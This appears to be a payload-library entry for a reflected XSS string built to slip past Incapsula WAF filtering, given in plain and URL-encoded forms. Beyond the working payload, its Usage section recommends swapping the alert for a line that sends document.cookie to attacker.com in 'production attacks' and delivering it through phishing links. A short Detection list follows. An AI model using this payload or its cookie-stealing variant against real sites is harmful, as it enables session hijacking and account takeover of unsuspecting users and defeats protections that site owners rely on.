---
id: c5119b05-ec2c-4a27-9f43-cf55c779279d
name: XSS-Payload-to-Bypass-Incapsula-WAF
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.478974+00:00'
updated_at: '2023-04-10T20:21:53.394693+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - waf-bypass
  - incapsula
validated: true
---

# XSS-Payload-to-Bypass-Incapsula-WAF

## Code

```javascript
anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

## Description

This JavaScript payload is designed to bypass Incapsula WAF protections during a reflected XSS attack. It uses a non-malicious alphanumeric prefix ("anythinglr00") and suffix ("uxldz") to evade signature detection, while closing any existing <script> tag with </script> and injecting a new one to execute alert(document.domain). The second line is the URL-encoded version for use in GET parameters. This payload exploits applications that reflect user input inside script contexts without proper escaping.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (none) | This is a static payload; customize the alert() action (e.g., replace with document.cookie exfiltration) | alert('test') |

## Usage

Inject this payload into a vulnerable URL parameter (e.g., ?c1=payload) on a target behind Incapsula. Test via browser or tools like curl/Burp Suite. For production attacks, modify the alert to send data to an attacker server: alert(document.location='http://attacker.com?data='+document.cookie). Deliver via phishing links or direct URL access to trigger in the victim's browser.

## Detection

- WAF logs showing blocked or allowed requests with script tag patterns or alphanumeric junk.
- Browser console errors or JavaScript execution logs revealing alert() or domain references.
- Network traffic to unexpected domains if exfiltration is added.
- Application logs with reflected inputs containing </script><script> sequences.

## Related

- [[procedures/Incapsula-WAF-Bypass-via-XSS-Attack]]
